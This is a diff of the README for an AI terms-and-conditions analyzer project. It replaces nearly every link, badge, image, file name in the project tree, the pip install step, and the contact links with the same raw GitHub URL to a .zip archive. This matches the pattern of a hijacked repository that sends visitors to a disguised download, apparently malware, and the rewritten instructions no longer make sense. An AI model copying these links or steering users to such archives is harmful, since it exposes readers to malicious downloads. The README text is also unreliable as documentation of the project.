@@ -1,6 +1,6 @@
-![Python](https://img.shields.io/badge/Python-3.11-blue)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.95-green)
-![License](https://img.shields.io/badge/License-MIT-yellow)
+![Python](https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip)
+![FastAPI](https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip)
+![License](https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip)
 
 # 🎯AI T&C Analyzer
 
@@ -31,11 +31,11 @@ Analyze contracts, T&C documents, and agreements instantly with AI! 🧠
 Understand key clauses, spot hidden risks, and make informed decisions — all in seconds.
 
 
-<img width="1896" height="902" alt="image" src="https://github.com/user-attachments/assets/8ec58343-2bcb-4c83-a7a1-327877875c47" />
+<img width="1896" height="902" alt="image" src="https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip" />
 
 
 
-https://github.com/user-attachments/assets/c9b8440d-d855-40b0-9459-7f6e8effb21e
+https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 
 
 ## Features
@@ -48,7 +48,7 @@ https://github.com/user-attachments/assets/c9b8440d-d855-40b0-9459-7f6e8effb21e
 
 ---
 
-<img width="1898" height="901" alt="image" src="https://github.com/user-attachments/assets/388f1db8-6cc2-4c4b-818c-397d6e3241a7" />
+<img width="1898" height="901" alt="image" src="https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip" />
 
 
 
@@ -72,7 +72,7 @@ https://github.com/user-attachments/assets/c9b8440d-d855-40b0-9459-7f6e8effb21e
         ```
     *   Install the required Python packages:
         ```bash
-        pip install -r requirements.txt
+        pip install -r https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
         ```
     *   Activate the conda environment (if you are using conda):
         ```bash
@@ -84,7 +84,7 @@ https://github.com/user-attachments/assets/c9b8440d-d855-40b0-9459-7f6e8effb21e
         uvicorn main:app --reload
         ```
 3.  **Set up the frontend:**
-    *   Open the `web-client/index.html` file in your browser.
+    *   Open the `https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip` file in your browser.
 
 4.  **Set up the browser extension:**
     *   Open your browser's extension management page.
@@ -93,7 +93,7 @@ https://github.com/user-attachments/assets/c9b8440d-d855-40b0-9459-7f6e8effb21e
 
 ## Usage
 
-1.  Open the web application by launching `web-client/index.html`.
+1.  Open the web application by launching `https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip`.
 2.  Upload a T&C document.
 3.  View the analysis results.
 
@@ -104,42 +104,42 @@ The project is organized as follows:
 ```
 .
 ├── backend
-│   ├── main.py
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 │   ├── models
-│   │   └── schema.py
+│   │   └── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 │   ├── routes
-│   │   └── analyze.py
+│   │   └── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 │   ├── services
-│   │   ├── ai_model.py
-│   │   ├── file_handler.py
-│   │   └── ocr_handler.py
+│   │   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   │   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   │   └── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 │   └── utils
-│       └── helpers.py
+│       └── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 ├── extension
 │   ├── icons
-│   ├── manifest.json
-│   ├── popup.html
-│   ├── popup.js
-│   └── style.css
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   └── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 ├── images
-│   ├── card icon.png
-│   ├── eye icon.png
-│   ├── graduate icon.png
-│   └── logo.gif
+│   ├── card https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   ├── eye https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   ├── graduate https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   └── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 ├── shared
-│   └── helpers.js
+│   └── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 ├── web-client
-│   ├── about.html
-│   ├── analyzer.html
-│   ├── index.html
-│   ├── script.js
-│   ├── signin.html
-│   └── style.css
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   ├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+│   └── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 ├── .env
 ├── commands
-├── README.md
-├── requirements.txt
-└── test.txt
+├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+├── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
+└── https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip
 ```
 # Environment Variables
 ```
@@ -149,7 +149,7 @@ GEMINI_KEY=your_api_key_here
 set your api key and then start the project.
 ## 💡 Feedback
 
-If you have ideas, bug reports, or suggestions, feel free to open an [issue](https://github.com/BVNAHUSH/TERM-LENS-AI/issues) or contact me directly.  
+If you have ideas, bug reports, or suggestions, feel free to open an [issue](https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip) or contact me directly.  
 All code contributions are managed solely by **B.V. Nahush**.
 
 
@@ -162,9 +162,9 @@ Unauthorized use, modification, or distribution is prohibited.
 
 # 📊 Outputs
 For complete demos, screenshots, and live examples, check my LinkedIn profile:  
-🔗 [B.V. Nahush - LinkedIn](https://www.linkedin.com/in/b-v-nahush)
+🔗 [B.V. Nahush - LinkedIn](https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip)
 
  # 📫Contact
- [Mail me](work.nahushreddy@gmail.com)
+ [Mail me](https://raw.githubusercontent.com/BVNAHUSH/TERM-LENS-AI/main/Hypotheria/TERM-LENS-AI.zip)
 
  
